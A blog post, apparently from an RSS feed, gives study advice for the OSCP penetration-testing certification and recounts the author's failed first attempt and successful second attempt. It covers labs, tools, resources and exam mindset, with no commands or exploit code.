<h2 id="preparing-for-oscp">Preparing for OSCP:</h2>
<h4 id="1-official-pwk-training">1. <strong>Official PWK Training:</strong></h4>
<p>The Offensive Security Penetration Testing with Kali Linux (PWK) course is the official training for OSCP. This course includes:</p>
<ul>
<li>
<p><strong>Comprehensive Study Materials:</strong> The provided PDFs and videos cover various penetration testing topics, from basic concepts to advanced techniques.</p>
</li>
<li>
<p><strong>Lab Environment:</strong> The PWK labs simulate real-world scenarios, allowing candidates to practice enumeration, exploitation, and privilege escalation in a controlled environment.</p>
</li>
</ul>
<h4 id="2-hands-on-practice">2. <strong>Hands-On Practice:</strong></h4>
<p>Practical experience is key to succeeding in the OSCP exam. Here are some ways to build your skills:</p>
<ul>
<li>
<p><strong>Vulnerable Machine Platforms:</strong> Practice on platforms like Hack The Box, TryHackMe, PG Practice and VulnLab etc. These platforms offer a wide variety of machines with varying levels of difficulty.</p>
</li>
<li>
<p><strong>Buffer Overflow Exploitation:</strong> Learn how to identify and exploit buffer overflow vulnerabilities, as these are a critical component of the exam.</p>
</li>
<li>
<p><strong>Privilege Escalation:</strong> Practice both Windows and Linux privilege escalation techniques, as they are essential for gaining root or administrative access.</p>
</li>
</ul>
<h4 id="3-tools-and-techniques">3. <strong>Tools and Techniques:</strong></h4>
<p>Familiarize yourself with essential tools and techniques, including:</p>
<ul>
<li>
<p><strong>Nmap:</strong> For network scanning and enumeration. Don’t overlook the importance of performing UDP scans, as certain services may only be accessible through UDP and could be crucial for exploitation.</p>
</li>
<li>
<p><strong>Metasploit:</strong> While limited use is allowed during the exam, understanding its functionalities is beneficial.</p>
</li>
<li>
<p><strong>Burp Suite:</strong> For web application testing and debugging.</p>
</li>
<li>
<p><strong>Manual Exploitation:</strong> Learn to exploit vulnerabilities without relying solely on automated tools.</p>
</li>
<li>
<p><strong>Backup Plans:</strong> Always have a backup plan. Learn more than one technique or use more than one tool for a specific task. Some tools or techniques might fail in certain situations, while alternatives can help you succeed.</p>
</li>
</ul>
<h4 id="4-learning-resources">4. <strong>Learning Resources:</strong></h4>
<p>Enhance your knowledge using additional resources, such as:</p>
<ul>
<li>
<p><strong>HTB Academy:</strong> A platform offering guided learning paths for various penetration testing techniques.</p>
</li>
<li>
<p><strong>TCM Security Courses:</strong> Focused training on Windows privilege escalation, Linux privilege escalation, and practical ethical hacking.</p>
</li>
<li>
<p><strong>TryHackMe Learning Paths:</strong> Valuable paths like Junior Penetration Tester, Offensive Pentesting, and OWASP Top 10 Web Application Attacks provide structured guidance.</p>
</li>
</ul>
<h4 id="5-documentation-skills">5. <strong>Documentation Skills:</strong></h4>
<ul>
<li>
<p>Practice documenting your findings during preparation. Good documentation is critical for both the exam and your final report submission.</p>
</li>
<li>
<p>Use templates to streamline your reporting process and ensure all necessary details are included.</p>
</li>
</ul>
<h4 id="6-tips-tricks-and-cheatsheets">6. <strong>Tips, Tricks, and Cheatsheets:</strong></h4>
<p>Utilize comprehensive guides and resources to aid your learning and troubleshooting:</p>
<ul>
<li>
<p><strong>Hacktricks:</strong> <a href="https://book.hacktricks.xyz/">https://book.hacktricks.xyz/</a></p>
</li>
<li>
<p><strong>PayloadAllTheThings:</strong> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a></p>
</li>
</ul>
<h4 id="7-time-management">7. <strong>Time Management:</strong></h4>
<ul>
<li>
<p>Create a schedule during your preparation phase to cover all topics systematically.</p>
</li>
<li>
<p>During the exam, allocate time wisely to ensure all machines are addressed, and leave enough time for documentation.</p>
</li>
</ul>
<h4 id="8-community-and-support">8. <strong>Community and Support:</strong></h4>
<ul>
<li>
<p>Join online forums, Discord servers, or Reddit communities dedicated to OSCP preparation. Engaging with others can provide insights, tips, and encouragement.</p>
</li>
<li>
<p>Study groups can also help you stay motivated and learn from others’ experiences.</p>
</li>
</ul>
<h4 id="9-mindset-and-persistence">9. <strong>Mindset and Persistence:</strong></h4>
<ul>
<li>
<p>Develop a problem-solving mindset. The OSCP exam tests your ability to think critically and adapt to unexpected challenges.</p>
</li>
<li>
<p>Be persistent. Failure is part of the learning process, and each setback provides an opportunity to improve.</p>
</li>
</ul>
<hr>
<h2 id="my-oscp-journey">My OSCP Journey:</h2>
<p>Passing the OSCP was a transformative experience. It required months of preparation, countless hours of practice, and unwavering determination. The exam challenged me not only technically but also mentally. Here are some takeaways from my journey:</p>
<ul>
<li>
<p><strong>First Attempt:</strong> I didn’t pass on my first attempt, but this failure was a valuable learning experience. It taught me to refine my strategies, improve my time management, and focus more on areas where I was weak.</p>
</li>
<li>
<h4 id="second-attempt-and-success">Second Attempt and Success:</h4>
</li>
</ul>
<p>After my initial failure, I re-evaluated my preparation approach. I focused on:</p>
<ul>
<li>
<p><strong>Strengthening Weak Areas:</strong> I identified the topics and techniques where I struggled and dedicated extra time to mastering them.</p>
</li>
<li>
<p><strong>Enhanced Practice:</strong> I worked on additional machines on platforms like Hack The Box and PG Practice, ensuring I encountered diverse scenarios.</p>
</li>
<li>
<p><strong>Time Management:</strong> I implemented a structured approach during the exam, allocating specific times for enumeration, exploitation, and documentation.</p>
</li>
<li>
<p><strong>Consistency is Key:</strong> Regular practice and revisiting fundamental concepts helped me build a strong foundation.</p>
</li>
<li>
<p><strong>Lab Work:</strong> The PWK labs were invaluable for honing my skills and building confidence.</p>
</li>
<li>
<p><strong>HTB Academy:</strong> HTB Academy was an essential resource during my preparation. Its structured learning paths and practical exercises provided clarity on advanced topics and helped me approach challenges more methodically.</p>
</li>
<li>
<p><strong>UDP Scans:</strong> I learned the importance of performing UDP scans. Several services critical to exploitation were only accessible through UDP, highlighting the need for thorough scanning.</p>
</li>
<li>
<p><strong>Backup Plans:</strong> Having backup plans for tools and techniques proved invaluable. When one method failed, alternative tools or strategies ensured continued progress.</p>
</li>
<li>
<p><strong>Documentation:</strong> Maintaining detailed notes during preparation proved essential during the exam and for writing the final report.</p>
</li>
</ul>
<p>Achieving the OSCP has not only validated my technical skills but also opened new doors in my cybersecurity career. It’s more than just a certification, it’s a testament to perseverance and expertise. Achieving the OSCP was a moment of pride not just for me but for my family. My success surprised everyone, and I was showered with gifts and encouragement from my cousins, who were thrilled by my accomplishment.</p>
<hr>
<h2 id="final-thoughts">Final Thoughts:</h2>
<p>The OSCP journey is challenging but incredibly rewarding. Here are my final words:</p>
<ul>
<li>
<p><strong>Don’t Panic:</strong> Stay calm and composed during the exam. Break tasks into smaller steps and tackle them methodically.</p>
</li>
<li>
<p><strong>Believe in Yourself:</strong> Confidence in your preparation and abilities can make a significant difference.</p>
</li>
<li>
<p><strong>Stay Focused:</strong> Avoid distractions and stick to your planned strategy.</p>
</li>
</ul>
<p>To anyone preparing for the OSCP, remember: <em>You can do it!</em> With persistence, practice, and the right mindset, this goal is absolutely achievable. Good luck on your journey!</p>
<hr>
]]></content>
        </item>
        
    </channel>
</rss>
